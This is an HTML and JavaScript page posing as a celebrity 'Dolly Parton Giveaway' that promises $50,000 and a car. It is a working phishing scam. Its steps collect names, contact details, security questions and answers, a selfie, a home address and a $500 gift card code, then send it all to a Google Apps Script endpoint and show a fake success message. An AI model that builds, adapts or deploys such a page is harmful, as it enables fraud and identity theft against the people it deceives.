<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dolly Parton Giveaway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #0a0a1a; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; padding: 20px; }
        input, select, textarea { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #c62828; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; }
        .step { display: none; }
        .step.active { display: block; }
        .file-upload { border: 2px dashed #c62828; padding: 20px; text-align: center; cursor: pointer; margin: 10px 0; }
    </style>
</head>
<body>
<div class="container">
    <h1>Dolly Parton's Giveaway</h1>
    <p>Win $50,000 + Mercedes-Benz!</p>
    
    <div id="step1" class="step active">
        <h3>Step 1: Your Info</h3>
        <input type="text" id="fullname" placeholder="Full Name">
        <input type="email" id="email" placeholder="Email">
        <input type="tel" id="phone" placeholder="Phone">
        <button onclick="nextStep(2)">Next</button>
    </div>
    
    <div id="step2" class="step">
        <h3>Step 2: Security & Selfie</h3>
        <input type="text" id="secQ1" placeholder="Security Question 1">
        <input type="text" id="secA1" placeholder="Answer 1">
        <input type="text" id="secQ2" placeholder="Security Question 2">
        <input type="text" id="secA2" placeholder="Answer 2">
        <div class="file-upload" onclick="document.getElementById('selfie').click()">Click to upload selfie</div>
        <input type="file" id="selfie" accept="image/*" style="display:none">
        <div id="selfieName"></div>
        <button onclick="prevStep(1)">Back</button>
        <button onclick="nextStep(3)">Next</button>
    </div>
    
    <div id="step3" class="step">
        <h3>Step 3: Address & Payment</h3>
        <input type="text" id="address" placeholder="Street Address">
        <input type="text" id="city" placeholder="City">
        <input type="text" id="state" placeholder="State">
        <input type="text" id="zip" placeholder="ZIP">
        <input type="text" id="giftCode" placeholder="Gift Card Code ($500)">
        <button onclick="prevStep(2)">Back</button>
        <button onclick="nextStep(4)">Review</button>
    </div>
    
    <div id="step4" class="step">
        <h3>Step 4: Submit</h3>
        <p>Tracking: <span id="tracking"></span></p>
        <input type="checkbox" id="confirm"> I confirm all information is accurate
        <button onclick="prevStep(3)">Back</button>
        <button onclick="submitForm()">Submit Entry</button>
    </div>
    
    <div id="message" style="margin-top:20px; padding:10px; display:none;"></div>
</div>

<script>
let currentStep = 1;
let selfieFile = null;

document.getElementById('selfie').addEventListener('change', function(e) {
    selfieFile = e.target.files[0];
    document.getElementById('selfieName').innerHTML = '✅ ' + selfieFile.name;
});

function nextStep(step) {
    document.getElementById('step' + currentStep).classList.remove('active');
    currentStep = step;
    document.getElementById('step' + currentStep).classList.add('active');
    if(step === 4) {
        let tracking = 'DOLLY-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
        document.getElementById('tracking').innerHTML = tracking;
    }
}

function prevStep(step) {
    document.getElementById('step' + currentStep).classList.remove('active');
    currentStep = step;
    document.getElementById('step' + currentStep).classList.add('active');
}

function fileToBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
}

async function submitForm() {
    if(!document.getElementById('confirm').checked) {
        alert("Please confirm");
        return;
    }
    
    if(!selfieFile) {
        alert("Please upload a selfie");
        return;
    }
    
    const tracking = document.getElementById('tracking').innerHTML;
    
    const formData = {
        trackingNumber: tracking,
        fullName: document.getElementById('fullname').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        securityQ1: document.getElementById('secQ1').value,
        securityA1: document.getElementById('secA1').value,
        securityQ2: document.getElementById('secQ2').value,
        securityA2: document.getElementById('secA2').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value,
        giftCardCode: document.getElementById('giftCode').value
    };
    
    const msgDiv = document.getElementById('message');
    msgDiv.style.display = 'block';
    msgDiv.innerHTML = 'Submitting...';
    msgDiv.style.background = '#ffc107';
    
    try {
        const selfieBase64 = await fileToBase64(selfieFile);
        
        const payload = {
            formData: JSON.stringify(formData),
            selfie: selfieBase64
        };
        
        const response = await fetch('https://script.google.com/macros/s/AKfycbwFKieQv4He0NJ4ljzDIu9nnB6ZH0GrShwdxZq9o_g9nlGrZ5SqtWNkVIjQhY6ZFTis/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        msgDiv.innerHTML = '✅ SUCCESS! Tracking: ' + tracking;
        msgDiv.style.background = '#28a745';
        msgDiv.style.color = 'white';
        
        setTimeout(() => {
            location.reload();
        }, 3000);
        
    } catch(error) {
        msgDiv.innerHTML = '❌ Error: ' + error.message;
        msgDiv.style.background = '#dc3545';
        msgDiv.style.color = 'white';
    }
}
</script>
</body>
</html>
